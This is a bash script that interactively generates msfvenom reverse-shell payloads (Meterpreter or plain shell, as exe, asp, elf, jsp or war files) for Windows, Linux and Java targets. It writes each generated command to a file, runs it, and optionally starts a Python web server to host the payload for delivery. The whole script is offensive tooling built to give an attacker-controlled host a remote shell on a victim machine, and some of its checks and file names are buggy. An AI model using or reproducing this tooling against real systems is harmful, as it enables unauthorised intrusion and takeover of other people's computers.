#!/usr/bin/bash

rm revshell.sh
touch revshell.sh

flg0=0
while [ "$flg0" = "0" ]
do

   script=""

   flg=0

   while [ "$flg" = "0" ]
   do
      read -p  'Windows or Linux or Mac or Java? (w/l/m/j) >' os

      if [ -z $os ] ; then
         echo "Input w or l or m or j"
      elif [ $os = 'W' ] || [ $os = 'w' ] || [ $os = 'L' ]  || [ $os = 'l' ] || [ $os = 'M' ]  || [ $os = 'm' ] || [ $os = 'J' ]  || [ $os = 'j' ] ; then
         flg="1"
      fi
   done

   flg=0

   while [ "$flg" = "0" ]
   do
      read -p  'X86 or X64 (86/64) >' bit

      if [ -z $bit ] ; then
         echo "Input 86 or 64"
      elif [ $bit = '86' ] || [ $bit = '64' ] ; then
         flg="1"
      fi
   done

   flg=0

   ifconfig
   while [ "$flg" = "0" ]
   do
      read -p  'LHOST ? >' lhost

      if [ -z $lhost ] ; then
         echo "Input LHOST"
      else
         flg="1"
      fi
   done

   flg=0

   while [ "$flg" = "0" ]
   do
      read -p  'LPORT ? >' lport

      if [ -z $lport ] ; then
         echo "Input LPORT"
      else
         flg="1"
      fi
   done

   flg=0

   while [ "$flg" = "0" ]
   do
      read -p  'File Type (elf/exe/macho/asp/jsp/war) >' ftype

      if [ -z $ftype ] ; then
         echo "Input File Type"
      elif [ $ftype = 'elf' ] || [ $ftype = 'exe' ] || [ $ftype = 'macho' ]  || [ $ftype = 'asp' ] || [ $os = 'jsp' ]  || [ $os = 'war' ] ; then
         flg="1"
      fi
   done

   flg=0

   while [ "$flg" = "0" ]
   do
      read -p  'Shell or Meterpreter (s/m) >' payload

      if [ -z $payload ] ; then
         echo "Input s or m"
      elif [ $payload = 'S' ] || [ $payload = 's' ] || [ $payload = 'M' ]  || [ $payload = 'm' ] ; then
         flg="1"
      fi
   done

   if [ $os = "w" ] || [ $os = 'w' ] ; then
      if [ $bit = '86' ] ; then
         if [ $payload = "m" ] ; then
            if [ $ftype = "exe" ] ; then
               script="msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe > /root/www/revshell/win_86_meter_$lhost_$lport.exe"
            elif [ $ftype = "asp" ] ; then 
               script="msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f asp > /root/www/revshell/win_86_meter_$lhost_$lport.asp"
            fi
         else
            if [ $ftype = "exe" ] ; then
               script="msfvenom -p windows/shell/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe > /root/www/revshell/win_86_shell_$lhost.exe"
            elif [ $ftype = "asp" ] ; then 
               script="msfvenom -p windows/shell/reverse_tcp LHOST="$lhost" LPORT="$lport" -f asp > /root/www/revshell/win_86_shell_$lhost.asp"
            fi
         fi
      else   
         if [ $payload = "m" ] ; then
            if [ $ftype = "exe" ] ; then
               script="msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe > /root/www/revshell/win_64_meter_$lhost_$lport.exe"
            elif [ $ftype = "asp" ] ; then
               script="msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f asp > /root/www/revshell/win_64_meter_$lhost_$lport.asp"
            fi
         else
            if [ $ftype = "exe" ] ; then
               script="msfvenom -p windows/x64/shell/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe > /root/www/revshell/win_64_shell_$lhost.exe"
            elif [ $ftype = "asp" ] ; then
               script="msfvenom -p windows/x64/shell/reverse_tcp LHOST="$lhost" LPORT="$lport" -f asp > /root/www/revshell/win_64_shell_$lhost.asp"
            fi
         fi
      fi
   fi
         
   if [ $os = "L" ] || [ $os = 'l' ] ; then
      if [ $bit = '86' ] ; then
         if [ $payload = "m" ] ; then
            if [ $ftype = "elf" ] ; then
               script="msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf > /root/www/revshell/linux_86_meter_$lhost_$lport.elf"
            fi
         else
            if [ $ftype = "elf" ] ; then
               script="msfvenom -p linux/x86/shell/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf > /root/www/revshell/linux_86_meter_$lhost.elf"
            fi
         fi
      else   
         if [ $payload = "m" ] ; then
            if [ $ftype = "elf" ] ; then
               script="msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf > /root/www/revshell/linux_64_shell_$lhost_$lport.elf"
            fi
         else
            if [ $ftype = "elf" ] ; then
               script="msfvenom -p linux/x64/shell/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf > /root/www/revshell/linux_64_meter_$lhost.elf"
            fi
         fi
      fi
   fi
                  
   if [ $os = "J" ] || [ $os = 'j' ] ; then
      if [ $ftype = "jsp" ] ; then
            script="msfvenom -p java/jsp_shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw > /root/www/revshell/java_shell_$lhost_$lport.jsp"
      elif [ $ftype = "war" ] ; then
            script="msfvenom -p java/jsp_shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f war > /root/www/revshell/java_shell_$lhost_$lport.war"
      fi
   fi
      
   if [ $script = "" ] ; then
      read -p "Generation Faild. Option Combination id Bad. Retry? >" retry
      if [ $retry = "Y" ] || [ $retry = "y" ] ; then
         echo ""
      else
         flg0=1
      fi      
   else
      echo $script
      echo $script > revshell.sh
      chmod 777 revshell.sh
      ./revshell.sh
      flg0=1
   fi
done

flg=0

while [ "$flg" = "0" ]
do
   read -p "Start python web server? > " input
   if [ -z $input ] ; then
      echo "Input Y or N"
   elif [ $input = 'Y' ] || [ $input = 'y' ] || [ $input = 'N' ]  || [ $input = 'n' ] ; then
      flg="1"
   fi
done

if [ $input = 'Y' ] || [ $input = 'y' ] ; then
   read -p "What port? > " input2
   cd /root/www
   python3 -m http.server $input2
fi 

